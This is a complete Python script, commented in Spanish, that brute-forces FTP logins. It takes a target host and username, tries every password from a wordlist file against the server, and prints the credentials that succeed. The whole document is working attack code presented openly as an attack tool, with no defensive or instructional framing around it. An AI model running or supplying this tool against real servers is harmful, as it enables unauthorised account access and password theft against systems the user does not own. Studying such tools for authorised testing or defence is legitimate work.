import argparse
import ftplib
import sys
from os import path

# Paso de argumentos de linea de comandos
def argumentos():
  parser = argparse.ArgumentParser(description='Fuerza bruta FTP por diccionario')
  parser.add_argument('-t', '--target', required=True, help='IP o host del servidor FTP')
  parser.add_argument('-u', '--user', required=True, help='Usuario FTP a atacar')
  return parser.parse_args()

# Intento de autenticacion FTP con usuario y contraseña dados
def login(host, user, passwd):
  try:
    ftp = ftplib.FTP(host)
    ftp.login(user, passwd)
    ftp.quit()
    return True
  except ftplib.error_perm:
    # Credenciales incorrectas, retorna falso para continuar
    return False

def main():
  args = argumentos()
  host = args.target
  user = args.user

  # Verificar que el diccionario existe en el directorio actual
  if path.exists('diccionario.txt'):
    lista = open('diccionario.txt','r')
    lista = lista.read().split('\n')
  else:
    print('No se encontro el archivo diccionario.txt')
    sys.exit(1)

  print(f'Iniciando ataque contra {host} con usuario "{user}"')
  print(f'Palabras cargadas: {len(lista)}')

  # Iterar sobre cada contraseña del diccionario
  for passwd in lista:
    if passwd == '':
      continue

    try:
      if login(host, user, passwd):
        print(f'\n[+] Contraseña encontrada: {passwd}')
        sys.exit()
      else:
        print(f'Fallido: {passwd}')
    except Exception as e:
      # Error de conexion u otro fallo inesperado
      print(f'Error de conexion: {e}')
      sys.exit(1)

  print('\n Contraseña no encontrada en el diccionario')

if __name__ == '__main__':
  try:
    main()
  except KeyboardInterrupt:
    sys.exit()
